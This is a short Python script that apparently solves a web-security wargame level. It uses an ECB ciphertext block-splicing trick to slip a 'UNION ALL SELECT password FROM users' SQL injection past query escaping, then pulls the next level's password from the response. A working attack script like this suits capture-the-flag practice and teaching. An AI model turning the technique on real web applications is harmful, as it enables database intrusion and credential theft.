import config
import os, re, base64
from urllib import unquote
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

"""
The query parameter in the first page is first escaped for SQL injections.
Then it is inserted into an SQL query like "SELECT * FROM table WHERE content LIKE '%query%'"
Then it is encrypted using a block cipher with a block size of 16. And the encoded using base64.
By sending different codes, we figured out that our query is inserted in the third block.
Also the third block needs 10 characters to fill.

The first requests sends and SQL injection that will give us the encoded form.
We only insert 9 spaces because after escaping there will be a backslash inserted before the opening "'"
which fills the third block.

Now we just need to replace the third block of the encrypted string which contains backslash with another block
which is contains only spaces. So we create another query with first 10 characters as spaces. Then we take first
three blocks of the plain query and combine it with the last blocks from the sql injection query and we're done.xs
"""

url = "http://{}.{}".format(user, config.url)

data = { "query" : " " * 9 + "' UNION ALL SELECT password FROM users;#" }

response = post(url, auth=(user, password), data=data)
encoded_sql = base64.b64decode(unquote(response.url.split("query=")[-1]))

response = post(url, auth=(user, password), data={ "query" : " " * 10 })
encoded_plain = base64.b64decode(unquote(response.url.split("query=")[-1]))

injection = encoded_plain[:48] + encoded_sql[48:]
params = { "query" : base64.b64encode(injection) }
response = get(url + "/search.php/", auth=(user, password), params=params)

password = re.findall(r"\w{32}", response.content)[-1]

print(password)
